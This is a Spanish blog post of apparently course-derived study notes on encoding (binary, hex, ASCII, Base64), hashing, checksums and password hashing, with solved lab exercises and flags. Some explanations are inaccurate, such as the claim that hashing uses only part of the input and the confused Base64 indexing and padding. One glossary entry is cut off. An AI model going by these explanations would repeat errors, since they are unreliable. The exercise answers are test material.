---
layout: post
title: Practical Tools
subtitle: Herramientas de pentesting básicas.
tags: [pen]
---
### 1. Cryptography.

Criptografía es aquella disciplina concerniente a la ocultación o ofuscación de la información de terceras partes no autorizadas. En otros términos sabemso que existe un concepto fundacional en CiberSeguridad; CIA (Confidenciality, Integrity & Availability), entonces la Criptografía abarcaría los dos primeros terciones de la CIA: confidenciabilidad e integridad de la información. Evita que nadie no autorizado pueda leer información sensible y en muchos casos, cifrar o codificar información es un paso deseable antes de transferir datos para evitar pérdida de información.

<br />

#### 1.1. Jerga Criptográfica.

Antes de profundizar en términos técnicos debemos de conocer el significado de diversos términos. A continuación vamos a presentar un glosario de Criptografia:

- **AES**: cifrado de bloque de clave simétrica de 128 bits con tres variantes de tamaño de clave fija.

- **Cifrado asimétrico**: modelo de cifrado que utiliza dos claves en el proceso de cifrado/descifrado, la clave pública del destinatario para cifrar un mensaje y la clave privada del destinatario para descifrar un mensaje.

- **Bit**: La unidad más pequeña de datos binarios. Debe ser 0 o 1.

- **Block Cipher**: un algoritmo de cifrado que opera en un grupo de bits a la vez en lugar de solo un bit a la vez en contraste con Stream Cipher.

- **Blowfish**: cifrado de bloque de clave simétrica de 64 bits con tamaño de clave variable.

- **Byte**: Ocho bits de datos binarios. Hay 256 (2^8) valores potenciales.

- **Texto cifrado**: texto que se ha transformado en un mensaje ilegible a través de algún algoritmo de cifrado.

- **Texto claro**: Texto legible por humanos. Se puede transformar en texto cifrado a través de un algoritmo de cifrado. Sinónimo de "texto plano".

- **Clave criptográfica**: una cadena de bits utilizada por un algoritmo criptográfico para transformar texto sin formato en texto cifrado o viceversa.

- **Decodificación**: Lo opuesto a la codificación.

- **Descifrado**: Lo opuesto al cifrado.

- **Digest**: la salida de un algoritmo hash.

- **Codificación**: Un medio de transformar datos de un formato a otro con la finalidad de asegurar la integridad en la transmisión de información aunque en ciberseguridad también se utiliza con fines de confidencialidad por ejemplo para proteger tráfico malicioso de herramientas como IDS/IPS. Suele ser un tipo de transformación suave, inmediatamente reversible que no requiere clave sino que codifica en un formato concreto (base64, Binario, Hexadecimal, etc)

- **Cifrado**: El proceso de transformar datos o mensajes con la finalidad de proteger la confidencialidad de los datos en su viaje entre dos puntos o en su almacenamiento, haciéndolos ilegibles y secretos haciendo uso de claves criptográficas; algoritmos de cifrado. Encontramos el cifrado simétrico cuando la clave de cifrado y de descifrado es la misma y el cifrado asimétrico cuando las claves son distintas de forma que lo que una cifra la otra lo descifra y viceversa.

- **Entropía**: La cantidad de imprevisibilidad en un texto cifrado dado. La entropía se refiere coloquialmente a qué tan cerca está el texto cifrado del texto ideal generado aleatoriamente.

- **Teorema fundamental de la aritmética**: La afirmación matemática de que todo número natural mayor que 1 debe ser primo o producto de factores primos únicos. Forma la base de muchas implementaciones de criptografía asimétrica.

- **Hash**: El output producido por un algoritmo hash. Sinónimo de "digerir".

- **Algoritmo hash**: Una función unidireccional que toma un input arbitraria y produce un output de longitud fija basada en un formato (MD5, SHA256, etc), de modo que cada entrada única produce unívocamente una salida. Al concepto de que dos entradas in.

- **MD5**: Formato de función de hash ampliamente utilizada que produce un resumen de 128 bits. Aunque MD5 se diseñó inicialmente para ser utilizado como una función hash criptográfica, se ha descubierto que sufre numerosas vulnerabilidades. Todavía se puede usar como una suma de verificación para verificar la integridad de los datos.

- **Nibble**: Cuatro bits de datos binarios. Hay 16 (2^4) valores potenciales.

- **Texto sin formato**: texto legible por humanos. Se puede transformar en texto cifrado a través de un algoritmo de cifrado.

- **Salt**: Un string añadido al final de una contraseña para crear un "digest" único cuando se ejecuta a través de un algoritmo hash.

- **Stream Cipher**: Un algoritmo de cifrado que opera en un bit de texto sin formato a la vez. Contrasta con Cifrado en bloque.

- **Cifrado de clave simétrica** : modelo de cifrado que utiliza la misma clave compartida tanto para el cifrado como para el descifrado.

<br />

#### 1.2. Encoding Part I.

La *codificación* es un proceso de conversión simple de datos que tiene cabida en múltiples contextos, por ejemplo para transferir datos, para almacenarlos o para ocultarlos a terceras partes. Lo más característico de la codificación es que es un proceso que se hace sin la necesidad de utilizar una clave de cifrado sino un formado de codificación como base64 o hexadecimal esto también provoca que la codificación es igual de fácil revertila cuando se conoce el formato de codificación.

Es fundamental entender que la codificar no es cifrar. Siempre que alguien pueda determinar las reglas que se aplicaron a los datos originales, puede revertir fácilmente la codificación sin ningún conocimiento especial, como contraseñas o claves secretas. Esto no ocurre en el cifrado ya que, concretamente en el cifrado asimétrico, conocer la transformación inicial no supone tener la clave de descifrado. Por esta razón, la codificación nunca debe usarse en una situación en la que la seguridad y la confidencialidad de los datos son de vital importancia.

<br />

##### 4.0.1.2.1. Binary Encoding.

**Definición y notación**

La codificación en formato binario es la más extendida en el mundo de la informática. Se trata de una forma de representación en base 2, es decir, es un formato que consiste en sólo dos componentes básicos que pueden tomar respectivamente dos valores, 1 o 0 que pueden ser interpretados de múltiples formas en función de la necesidad.

Estos valores se denominan 'bit' y se trata de la unidad de datos posible. Todos los programas ejecutables son contenido binario, tanto es así que con frecuencia se denominan "binarios" o 'binary files'. De esta forma, la codificación en binario nos permite utilizar una secuencia de bits, de unos y ceros, para representar datos complejos.

A menudo, para no confundir los números binarios y los decimales, los binarios tienen un prefijo consistente en 0b delante del número: 

```
0b100 = 2^2\*1 = 4
0b110 = 2^2\*1 + 2^1\*1 = 6
```

Por último, mencionar que dado que un byte consiste en 8 bits, el máximo valor que puede tener un byte es 255 unidades en decimal.
<br />

**obase, ibase, bc**

Sistemas como Linux contienen comandos que rápidamente convierten un número sobre una base distinta. De esto se encarga el comando 'bc' que actúa como una calculadora de números entre distintas bases.  

```bash
kali@kali:~$ echo "obase = 2 ; 7" | bc
111
```

El comando anterior define la base como 2 y el número decimal a convertir es 7 de forma que queremos que se convierta a binario el número 7.

```bash
kali@kali:~$ echo "ibase = 2 ; 111" | bc
7
```

Ahora el comando anterior define la base del número que se introduce como input (en este caso 2, estamos introduciendo un número binario) y queremos la vuelta en decimal. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221214103958.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Exercises**

**¿Cuánto es 234 en binario?**

```bash
echo "obase = 2; 234" | bc
11101010
```

<br />

**¿Cuánto es 10010101 en decimal?**

```bash
echo "ibase = 2; 10010101" | bc
149
```

<br />

**¿Cuál es la mascara de subred representada por 11111111.11111111.11100000.00000000**?

Pasando cada octeto a decimal obtenemos el siguiente número: 255.255.224.0
y utilizando un convertidor de mascaras de red obtenemos que la máscara es 19.

<br />

**¿Cuántos bits iguale a 1 hay en la máscara de subred de 255.128.0.0?**

Transformando cada uno de los números no nulos a binario obtenemos que son 9 los bits iguales a 1.

<br />

##### 4.0.1.2.2. Hexadecimal Encoding.

**Definición y notación**

Otro formato de codificación es el codificado en Hexadecimal. Este es un tipo de represetanción numérica de base 16, cuenta con las cifras del 0 al 9 y toma las 6 primeras letras del abecedario para representar las unidades siguientes del 9 al 15.

```
0, 1, 2, 3, 4, 5, 6, 7, 8, 9, A, B, C, D, E, F, 10, 11, 12, 13...
```

De forma que el 10 en hexadecimal sería el 16 en decimal y así. Observemos el paralelismo que hay entre los sistemas numéricos de base 2, 10 y 16. En todos ellos se utilizan cifras para representar todos aquellos números que están por debajo de la base utilizada y estan se reutilizan en ordenes de magnitud (unidades, decenas, centenas, etc) según el número representado hay alcanzado x veces la base:

```defaul
Binario: 10 > 2^1*1 + 2^0*0 = 2 + 0 = 2 en decimal
Decimal: 10 > 10^1*1 + 10^0*0 = 10 + 0 = 10 en decimal
Hexdecimal: 10 > 16^1*1 + 16^0*0 16 + 0 = 16 en decimal
```

De la misma forma que ocurría con los números binarios, la representación hexadecimal suele tener un prefijo asociado, el 0x: 

```defaul
0x110 = 16^2*1 + 16^1*1 + 16^0*0 = 256 + 16 = 272 en decimal
```

<br />

```defaul
0x1, 0x2, 0x3, 0x4, 0x5, 0x6, 0x7, 0x8, 0x9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf, 0x10 
```

Los números hexadecimal son legibles tanto a nivel máquina como a nivel humano.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221214125326.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Aplicaciones de la codificación de datos hexadecimal y herramientas **

- Los archivos ejecutables compilados a menudo contienen valores que no se pueden representar con los caracteres alfabéticos básicos tradicionales. Sin embargo, *podemos representar esos valores como codificados en hexadecima*l y, con la práctica, podemos acostumbrarnos rápidamente a reconocer si estamos observando un carácter que se puede imprimir o no.

- *La codificación hexadecimal también es fundamental para comprender las direcciones de memoria*. Cada vez que hablamos de direcciones de memoria, ya sea que estemos desarrollando un exploit o tal vez tratando de realizar una investigación forense, siempre usamos direcciones codificadas en hexadecimal.

- La mayoría de las distribuciones de Linux incluyen la *herramienta xxd* de forma predeterminada. Esta herramienta se puede utilizar para ver el contenido de los archivos en formato hexadecimal o binario. Por ejemplo :

```
kali@kali:~$ echo "offensive security" > test.txt

kali@kali:~$ xxd -l 16 test.txt
00000000: 6f66 6665 6e73 6976 6520 7365 6375 7269  offensive securi
```

Cada caracter es un byte que son concretamente la mitad de un número, 6f, 66, 65, etc. Es decir, la información está presentada como 8 grupos de dos bytes, es decir, 16 bytes, la longitud pedida inicialmente en el comando 'xxd -l 16'.

<br />

**Exercises**

*0xA1 en decimal*

```defaul
0XA1 = 16^1*A + 16^0*1 = 16*10 + 1 = 161
```

<br />

*162 en hexadecimal*

```defaul
162 = 160 + 2 = 16*10 + 1*2 = 16^1*A + 16^0*2 = 0xA2
```

<br />

Revisemos un ejemplo de volcado hexadecimal del encabezado TCP. Asigne el volcado con la estructura del encabezado TCP y responda las siguientes preguntas.

```defaul
ee 32 01 bb 41 22 c6 f3 00 00 00 00 a0 02 ff d7
fe 30 00 00 02 04 ff d7 04 02 08 0a 26 65 6d e3
00 00 00 00 01 03 03 07
```

La estructura del encabezado TCP se encuentra en la Figura 2 en la siguiente página del sitio web de Nmap: https://nmap.org/book/tcpip-ref.html

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221214180639.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que la cabecera TCP está ordenando en bloques de 4 bytes que a su vez se dividen en segmentos con lo que reordenamos la información obteniendo:

```hex
ee 32 01 bb --> Source Port(2)/Destination Port(2)
41 22 c6 f3 --> Sequence Number(4)
00 00 00 00 --> Acknowledgment Number(4)
a0 02 ff d7 --> Offset(1/2)/Reserved(1/2)/TCP Flags(1)/Window(2)
fe 30 00 00 --> CheckSum(2)/Urgent Pointer(2)
02 04 ff d7 --> TCP Options(+4)
04 02 08 0a 
26 65 6d e3
00 00 00 00 
01 03 03 07
```

De esta forma, respondemos a las preguntas:

**¿Cuál es, en decimal, el puerto de origen?**

Aunque los bytes estén separados, no debemos cometer el error de pensar que source port consiste en la unión de los dos números decimales obtenidos después de traducir del hexadecimal los dos bytes que mide source port. Source port es un dato cuya información ocupa 2 bytes y por tanto, el número es la unión de las cifras hexadecimales, no de las cifras decimales tras la conversión de estas.

```bash
echo "ibase = 16; EE32" | bc
60978
```

<br />

**¿Cuál es el puerto de destino en decimal?**

De nuevo, revisando el tcp header structre podemos observar que el puerto de destino es un WORD que mide 2 bytes, correspondientes de acuerdo a la plantilla a 01BB. Por tanto:

```bash
echo "ibase = 16; 01BB" | bc
```


Una estructura de datos que mide 2 bytes es denominada WORD, una de 4 DWORD, una de 8 QWORD.

**¿Cuál es el acknowledgment number en decimal?**

Echándo un vistazo  de nuevo al TCP Header observamos que esta se trata de un DWORD porque ocupa 4 bytes 000000 que sería 0.

<br />

##### 4.0.1.2.3. ASCII - American Standard Code for Information Interchange.

El *American Standard Code for Information Interchange* (ASCII) es un tipo de codificación que se utiliza para almacenar y procesar caracteres imprimibles y no imprimibles. Es el esquema de codificación predeterminado para la mayoría de los textos en la informática moderna. La mayoría de los archivos de texto y binarios se codificarán con ASCII.

En ASCII, cada carácter se representa con un número binario de 7 bits, una cadena de siete 0 o 1. ASCII contiene codificación para todos los caracteres alfanuméricos y símbolos en un teclado moderno, así como codificación para cosas como TAB, saltos de línea e incluso retrocesos.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221214195308.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 1.3. Encoding Part II.

A continuación vamos a aprender a utilizar la codificación Unicode, UTF y Base64.

<br />

##### 4.0.1.3.1. Unicode y UTF.

**Definición**

*Unicode* es un standard que asocia a cada caracter o 'code point' un número. Se dice que cada caracter sea mapea en un único valor.

Unicode, recoge caracteres del alfabeto latino así como del Cirilíco, Thai, and Hangul alphabets: U+0041 = "A". En total hay sobre un millón de caracteres visibles y no visibles (TAB) mapeados.

Por su parte el UTF es una forma de codificar utilizando este mapeo de caracteres. El formato más utilizado es el UTF-8 que utiliza 8 bits y es compatible con ASCII.
Los primeros 128 caracteres de Unicode son idénticos a los caracteres ASCII y UTF-8 utiliza un solo byte con los mismos valores binarios para representarlos. Por ejemplo, una "A" mayúscula está codificada en UTF-8 como 41 y también está codificada en ASCII Hex como 41. Esto significa que el texto ASCII válido también es Unicode codificado en UTF-8.

<br />

**icon**

*Icon* es una herramienta que permite el transformado del contenido de un fichero de un formato de codificado a otro. 

```bash
kali@kali:~$ file test.txt
test.txt: ASCII text

kali@kali:~$ iconv -f ASCII -t UTF-8 test.txt -o test2.txt

kali@kali:~$ file test2.txt
test2.txt: ASCII text
```

Observemos que en la última línea sigue apareciendo que se trata de un fichero ASCII debido a la compatibilidad entre los dos formatos mencionada anteriormente.

<br />

**Exercise**

**¿De acuerdo con la tabla ASCII, cuál es el mapeado del caracter 'R' en hexadecimal?**

52

**De acuerdo a la tabla ASCII, ¿cuál es el caracter decimal 40?**

(

**De acuerdo con la tabla ASCII,  decodificar los siguientes números hexadecimales: 4f537b64326364383235333336316139633733326432316361316433333635393963637d**

```bash
for i in 4f 53 7b 64 32 63 64 38 32 35 33 33 36 31 61 39 63 37 33 32 64 32 31 63 61 31 64 33 33 36 35 39 39 63 63 7d; do echo "0x$i" > file.txt; xxd -r file.txt; done
```

**Convierte el 'encoded.file' en un formato legible. La solución al ejercicio consiste en el equivalente ASCII de los contenidos del fichero.

```bash
iconv -f ISO-8859-1 -t ASCII//TRANSLIT 9cb83ce25cb95a8fad39322d082331f0-encoded.file

ACED
```

<br />

##### 4.0.1.3.2. Base64 Encoding.

**Definición**

El codificado Base64 es muy importante debido a que es utilizado con mucha frecuencia para transferir datos a lo largo de canales que sólo pueden representar 'text data'. De esta forma se garantiza la integridad de la información.

Por ejemplo, los datos escritos en binario pueden contener caracteres no printables y esto puede suponer un problema si el protocolo de transferencia sólo admite 'text caracters', aquí es donde Base64 entra en juego; esencialmente *convierte cualquier dato en binario en una secuencia codificada de caracteres printables*.

Base64 toma su nombre porque sólo utiliza 64 caracteres concretamente:

```
1-26: A to Z
27-52: a to z
53-62: 0 to 9
63: +
64: /
```

El caracter '=' también puede ser utilizado en esta codificación pero sólo en la parte final de la cadena a modo de relleno

<br />

¿Cómo trabaja Base64?**

Base64 trabaja convirtiendo 3 bytes de binario (bloque) en cuatro caracteres de Base64 por este motivo las cadenas codificadas en base64 siempre son más largas que las cadenas del texto original (a esto se le suma el hecho de que los caracteres en base64 ocupan 6 bits imentras que los caracteres binarios ocupan 8). Cuando la cadena resultante en base64 es indivisible entre 6 se añaden caracteres de relleno (ceros) hasta que queda divisible entre 6.

La salida Base64 contendrá un carácter "=" si el último bloque de entrada fue solo de dos bytes (sin los ceros agregados). Contendrá dos caracteres "=" si el último bloque de entrada fue solo un byte.

<br />

**Cli Base64**

Podemos hacer la codificación Base64 desde la línea de comandos usando el comando *base64*, que está disponible en la mayoría de las distribuciones de Linux de forma predeterminada.

Usemos echo -n y luego agreguemos nuestra cadena para codificarla, que es "Example text". Lo canalizaremos al comando base64 a través del 'pipe':

```bash
kali@kali:~$ echo "Example text" | base64
RXhhbXBsZSB0ZXh0Cg==

kali@kali:~$ echo RXhhbXBsZSB0ZXh0Cg== | base64 -d
Example text

kali@kali:~$ 
```

El comando echo agrega un *carácter de nueva línea invisible* al final del texto de forma predeterminada. Si queremos codificar una cadena exacta dentro de las comillas, podemos usar el modificador -n, que evita que echo agregue el carácter de nueva línea.

```bash
kali@kali:~$ echo -n "Example text" | base64
RXhhbXBsZSB0ZXh0

kali@kali:~$ echo RXhhbXBsZSB0ZXh0 | base64 -d
Example textkali@kali:~$
```

<br />

Por otra parte, en una máquina con Windows, podemos aprovechar la aplicación de línea de comandos [certutil.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil), para codificar y decodificar archivos en Base64. Dado que certutil opera en archivos, debemos comenzar colocando nuestra cadena codificada en Base64 en un archivo de texto simple.

```bash
c:\Users\User>echo RXhhbXBsZSB0ZXh0 > Base64.txt

c:\Users\User>certutil -decode Base64.txt outb64.txt
Input Length = 19
Output Length = 12
CertUtil: -decode command completed successfully.

c:\Users\User>type outb64.txt
Example text
```

Cuando usamos el comando type para mostrar el contenido de nuestro archivo de salida, encontramos que pudimos decodificar el texto con éxito.

<br />

**Exercises**

**Decodificar el contenido del fichero**

```bash
cat 16a8fac65cfc875e72a14b899bec413b-linux_base64 | base64 -d
```

<br />

**Codificar la cadena de caracteres: Offensive Security**

```bash
echo -n "Offensive Security" | base64 
```

<br />

##### 4.0.1.3.3. Challenge - Puting it all togheter.

Tenemos un fichero que debemos decodificar. En primer lugar, intentamos ver qué tipo de fichero o dicho de otro modo, intentamos descubrir cuáles el formato del contenido del fichero con 'file':

```bash
file 18311e6f8e1ba6d1289d542d49ecea1f-final-encoding-exercise

18311e6f8e1ba6d1289d542d49ecea1f-final-encoding-exercise: gzip compressed data, was "super-secret-file", last modified: Fri Apr 16 20:40:30 2021, from Unix, original size modulo 2^32 56
```

De esta forma observamos que se trata de un fichero comprimido 'gzip' cuyo nombre era "super-secret-file", añadimos al nombre del fichero la extensión '.gz' y empleamos el comando 'gunzip' para descomprimirlo:

```bash
mv 18311e6f8e1ba6d1289d542d49ecea1f-final-encoding-exercise 18311e6f8e1ba6d1289d542d49ecea1f-final-encoding-exercise.gz; gunzip 18311e6f8e1ba6d1289d542d49ecea1f-final-encoding-exercise.gz
```

Una vez tenemos el archivo descomprimido intentamos leer su contenido pero este no parece tener sentido:

```bash
cat 18311e6f8e1ba6d1289d542d49ecea1f-final-encoding-exercise            
4F537B492D616D2D616E2D656E636F64696E672D657870657274217D
```

Si observamos con detenimiendo, para un codificado hexadecimal o 'hexdump' con lo que aplicamos el siguiente comando para transformarlo a ASCII:

Primero, introducimos el string en un fichero 'file.txt' y lo abrimos para intercalar un espacio cada dos caracteres:

```defaul
4F 53 7B 49 2D 61 6D 2D 61 6E 2D 65 6E 63 6F 64 69 6E 67 2D 65 78 70 65 72 74 21 7D
```

Y ejecutamos el siguiente comando:

```bash
for i in `cat file.txt`; do echo "0x$i" > file2.txt; xxd -r file2.txt;done                               
OS{I-am-an-encoding-expert!}
```

<br />

#### 1.4. Hashing.

En esta sección vamos a estudiar lo que es el hashing. *Hashing* es el término que se utiliza para referirse a la transformación de un input de tamaño variable a un output hexadecimal de tamaño fijo. Este output es a menudo llamado 'Hash' o 'Digest'. Aunque la forma de operar depende del algoritmo de hashing empleado, esencialmente una función de hash lo que hace es tomar un input, seleccionar una cantidad de datos del input (es decir, no todo el input) y transformarlos para a partir de ellos formar el Digest.

Este método de transformación contiene una característica que dota al hashing de suma importancia y es que esta es una transformación de una sóla dirección, en el sentido de que no es reversible. Como sólo se utiliza una parcialidad de la totalidad de los datos para formar un hash único, el hash es por propia definición incompleto y por tanto, el proceso no puede revertirse por la razón fundamental de que la información ya no está en el hash. 

Observemos que con la codificación esto no ocurre así, en esta la información está ahí pero no puedes verla a no ser que sepas cuál es el formato de codificación empleado, sin embargo en el hashing la información no se puede obtener de vuelta porque no está en el digest.

Otra propiedad importante del hashing es que incluso el cambio más pequeño en los datos de entrada puede cambiar en gran medida el hash resultante. Debido a esto, el hashing a menudo se usa para verificar la integridad de algunos datos de entrada.

<br />

##### 4.0.1.4.1. Hashing Básico. 

Consideremos un ejemplo. Si tenemos dos documentos PDF muy grandes y sospechamos que son iguales, podemos intentar confirmarlo abriéndolos uno al lado del otro y leyendo oración por oración, verificando cada palabra y cada pieza de puntuación. Alternativamente, podemos simplemente codificar ambos PDF. Dado que cualquier pequeño cambio daría como resultado un hash diferente, sabemos que si los hash son iguales, los PDF son idénticos.

Hay muchos algoritmos hash comunes, incluidos MD5, SHA-1, SHA-2 y NTLM. Estos algoritmos a menudo difieren en la longitud del resumen.

Puede ser útil comenzar usando el algoritmo hash MD5 y la utilidad *md5sum* para familiarizarse con el hash.

*Tenga en cuenta que MD5 ya no se considera seguro porque ahora es posible obtener la entrada original debido a ciertas fallas en el algoritmo.**

<br />

**Exercises**

**En Kali Linux VM, cree un archivo con el nombre _test.txt_ redirigiendo la salida del comando "echo test". ¿Cuál es el hash MD5 del archivo _test.txt_ que creamos?**

```bash
echo "test" > test.txt; md5sum test.txt
d8e8fca2dc0f896fd7cb4cb0031ba249
```

<br />

**Sin cambiar el contenido del archivo, cambie el nombre del archivo test.txt que creamos a test2.txt. ¿Cuál es el hash del archivo test2.txt?**

```bash
mv test.txt test2.txt; md5sum test2.txt
d8e8fca2dc0f896fd7cb4cb0031ba249
```

Observamos por tanto que el nombre del archivo no varía el hash pues este se crea con los contenidos del fichero.

<br />

**Cree un nuevo archivo con el nombre _test3.txt_ redirigiendo la salida del comando "echo test." (fíjese en el punto después de la palabra test). ¿Cuál es el hash md5sum de este archivo?**

```bash
echo "test." > test.txt; md5sum test.txt | cut -d " " -f1
4cc5a1d62b276a076e5b06b0df7efd27
```

<br />

**¿Cuántos caracteres tienen los hashes fabricados anteriormente?**

```bash
echo "test." > test.txt; md5sum test.txt | cut -d " " -f1 | wc -m 
33
```

Observemos que por defecto kali añade un caracter no printeable consistente en un salto de línea que sí es detectado por el comando 'wc' y por tanto la respuesta no es 33 sino 32.

<br />

**Genere un fichero de 8 MB de contenido random y calcule hash con MD5**

```bash
dd if=/dev/urandom of=randomfile bs=4M count=2 &> /dev/null; md5sum randomfile | cut -d " " -f1 | wc -m
33
```

(&> /dev/null manda todo el output a /dev/null). Recordemos que wc ha contado el salto de línea y por tanto el resultado es 32. Esto muestra que independientemente del contenido, el largo del hash es siempre el mismo. Además 
introduciendo el siguiente comando:

```bash
for i in 1 2 3 4 5;do dd if=/dev/urandom of=randomfile bs=4M count=$i; md5sum randomfile | cut -d " " -f1 | wc -m;done

1+0 records in
1+0 records ou
4194304 bytes (4.2 MB, 4.0 MiB) copied, 0.0166513 s, 252 MB/s
33
2+0 records in
2+0 records ou
8388608 bytes (8.4 MB, 8.0 MiB) copied, 0.0276737 s, 303 MB/s
33
3+0 records in
3+0 records ou
12582912 bytes (13 MB, 12 MiB) copied, 0.0457812 s, 275 MB/s
33
4+0 records in
4+0 records ou
16777216 bytes (17 MB, 16 MiB) copied, 0.0525691 s, 319 MB/s
33
5+0 records in
5+0 records ou
20971520 bytes (21 MB, 20 MiB) copied, 0.0577148 s, 363 MB/s
33

```

Podemos observar que independientemente del tamaño del fichero, el hash también tiene la misma longitud. De esta forma en conclusión obtenemos que independiemente del nombre, el contenido y la longitud del fichero un hash siempre tiene la misma longitud para el mismo formato.

<br />

##### 4.0.1.4.2. Checksum. 

**Definición**

Uno de los usos más extendidos de los hashes son los 'checksum' o suma de verficación, estos se utilizan para probar la integridad de un archivo en una operación de transferencia. Por ejemplo, el propietario de una web cuelga un link de descarga de un PDF y además obtiene su hash que también expone al usuario.

Cuando el usuario descarga el PDF, por lo que sabemos hasta ahora de los hashes (para un mismo archivo y un mismo formato de hash cada input tiene un único digest) cuando obtiene su digest del PDF este coincide con el expuesto en la web se puede asumir con seguridad que ambos son el mismo archivo. Si por el contrario esto no ocurre, algo ha ocurrido en la descarga que ha cambiado los contenidos del archivo (fallo en la descarga) o bien alguien se las ha apañado para colgar un archivo distinto (malicioso), en cualquier caso no se trata del mismo archivo.

<br />

**Crear hashes en Windows y Linux**

En la mayoría de las distribuciones de Linux, las siguientes herramientas se instalan automáticamente y se pueden usar para calcular hashes: *md5sum*, *sha1sum*, *sha256sum*, y *sha512sum*. De forma predeterminada, leen el texto de la entrada estándar, pero también podemos proporcionar un nombre de archivo como parámetro.

En los sistemas operativos Windows, podemos usar la utilidad _certutil.exe_ [5](https://portal.offensive-security.com/courses/pen-100/books-and-videos/modal/modules/cryptography/hashing/checksums#fn5) incorporada para calcular hashes de archivos usando varios algoritmos.

```cmd
C:\Users\User> certutil -hashfile file sha256
SHA256 hash of file:
d8d934a2fe58cd41496fb61648143b3cf81edfdf5fa5e75d67104bdfb16cb5e9
CertUtil: -hashfile command completed successfully.
```

<br />

##### 4.0.1.4.3. Verificando los checksum.

Una vez hemos creado una serie de hashes sobre diversos ficheros, podemos utilizar el parámetro '-c' para comparar estos hashes:

```bash
kali@kali:~$ echo test1 > test1.txt

kali@kali:~$ echo test2 > test2.txt

kali@kali:~$ echo test3 > test3.txt

kali@kali:~$ sha256sum test1.txt test2.txt test3.txt > tests.sha256

kali@kali:~$ cat tests.sha256
634b027b1b69e1242d40d53e312b3b4ac7710f55be81f289b549446ef6778bee  test1.txt
7d6fd7774f0d87624da6dcf16d0d3d104c3191e771fbe2f39c86aed4b2bf1a0f  test2.txt
ab03c34f1ece08211fe2a8039fd6424199b3f5d7b55ff13b1134b364776c45c5  test3.txt

kali@kali:~$ sha256sum -c tests.sha256
test1.txt: OK
test2.txt: OK
test3.txt: OK
```

En este ejemplo, creamos tres archivos de prueba y guardamos sus hashes SHA256 en el archivo tests.sha256 . Luego usamos sha256sum con el modificador -c para comprobar los hashes calculados sobre la marcha de los archivos de prueba con sus hashes almacenados en el archivo tests.sha256.

<br />

**Exercises**

**Busque el hash SHA-256 de la cadena "Th151sth3fl4g". Calcule el hash en una máquina virtual Linux con la ayuda de _sha256sum_ y _echo_ . Tenga en cuenta el carácter de nueva línea del sufijo del comando echo.**

```bash
echo -n Th151sth3fl4g | sha256sum | cut -d " "  -f1
```

<br />

**Encuentre la suma SHA-1 de la cadena "Th151sth3fl4g". Como antes, calcule el hash en una máquina virtual Linux, pero use sha1sum**

```bash
echo -n Th151sth3fl4g | sha1sum | cut -d " "  -f1
```

<br />

**Inicie la máquina virtual Linux de destino y ejecute el siguiente comando desde la terminal: echo -n "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua" > loremipsum.txt**

```bash
echo -n "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua" > loremipsum.txt; sha512sum loremipsum.txt | cut -d " " -f1
```

<br />

**Hay tres archivos con sumas de verificación conocidas en la carpeta /home/apprentice/hashcheck. Uno de los archivos se cambió después de calcular y almacenar las sumas de verificación en files.sha256 . ¿Cuál es la nueva suma de comprobación del archivo que se modificó?**

```bash
apprentice@crypto:~$ cd hashcheck/
apprentice@crypto:~/hashcheck$ ls
file1.txt  file2.txt  file3.txt  files.sha256
apprentice@crypto:~/hashcheck$ sha256sum -c files.sha256 
file1.txt: OK
file2.txt: OK
file3.txt: FAILED
sha256sum: WARNING: 1 computed checksum did NOT match
apprentice@crypto:~/hashcheck$ sha256sum file3.txt 
735355062f5c15899c2f545f09d43a104068d9204422756651c558b43683b12b  file3.txt
```

Aquí podemos observar que la comparación del hash con el fichero actual no ha sido satisfactoria y por tanto el comando indica el fallo.

<br />

**En /usr, hay un archivo malicioso que coincide con este hash: "d61d579501ab8ff507120780191929d5". Su tarea es encontrar el archivo. El comando debe ejecutarse durante no más de un minuto. ¿Cuál es la ruta completa a la ubicación del malware?**

En primer lugar intentamos descubrir qué tipo de hash es utilizando [Hash-Identifier](https://www.kali.org/tools/hash-identifier/). Obtenemos que es MD5. Seguidamente empleamos el siguiente script desde /usr:

```bash
for i in `ls`;do cd $i 2>/dev/null; for j in `ls`;do Hash=`md5sum $(realpath $j) 2>/dev/null | cut -d " " -f1`; if [[ $Hash == "d61d579501ab8ff507120780191929d5" ]];then echo "[+] Found: `pwd`/$j";fi;done; cd ..;done
[+] Found: /usr/bin/virus
```

Este script se introduce en cada directorio, obtiene los hash de cada fichero y lo compara con el dado, si coincide despliega el path completo del fichero localizado.

<br />

#### 1.5. Password Security.

Una aplicación extremadamente importante del hashing de datos es el almacenamiento de contraseñas. En la mayoría de los sistemas, solo se almacenan los hash de las contraseñas. Si las contraseñas se guardan tal como las ingresa un usuario en texto sin formato, un adversario podría obtener acceso a ellas al comprometer la base de datos del sistema. Sin embargo, si sólo se guarda el hash de las contraseñas y luego se almacenan, el mismo nivel de compromiso tendría un impacto menor. Incluso si el atacante logra comprometer la base de datos, las contraseñas siguen siendo desconocidas. 

Durante el procedimiento de autenticación, el sistema calcula el hash de la contraseña proporcionada y verifica si el hash calculado coincide con el resumen almacenado que pertenece a ese usuario.

<br />

##### 4.0.1.5.1. Password Hashing Algorithms.

Es importante tener en cuenta que, a pesar de la naturaleza unidireccional prevista de un algoritmo hash, esto no garantiza que no se pueda recuperar una contraseña, dado un hash específico. Un método por el cual podríamos obtener una contraseña dado un hash es mediante el uso de técnicas de fuerza bruta.

Dado que cada input genera un único output si conseguimos un string cuyo hash coincide con el hash de la contraseña entonces tenemos la contraseña. De esta forma, con una lista de candidatos a contraseñas podemos obtener el hash de cada candidato y compararlo con el hash de la contraseña. Si encontramos una coincidencia entonces obtenemos la contraseña.

